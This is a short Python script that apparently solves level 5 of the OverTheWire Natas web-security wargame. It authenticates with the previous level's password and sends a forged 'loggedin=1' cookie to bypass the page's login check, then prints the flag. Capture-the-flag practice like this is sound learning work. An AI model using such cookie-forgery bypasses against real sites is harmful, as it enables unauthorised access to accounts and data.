import requests, natas, natas4

URL = 'http://natas5.natas.labs.overthewire.org'
USER = 'natas5'
PASS = natas4.flag
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
cookie = {"Cookie": "_ga=GA1.1.696930855.1733839339; _ga_RD0K2239G0=GS1.1.1733839338.1.0.1733839338.0.0.0; loggedin=1"}

flag = natas.get_flag(URL, auth_basic, cookie)

if __name__ == '__main__':
    print(natas.msg, flag)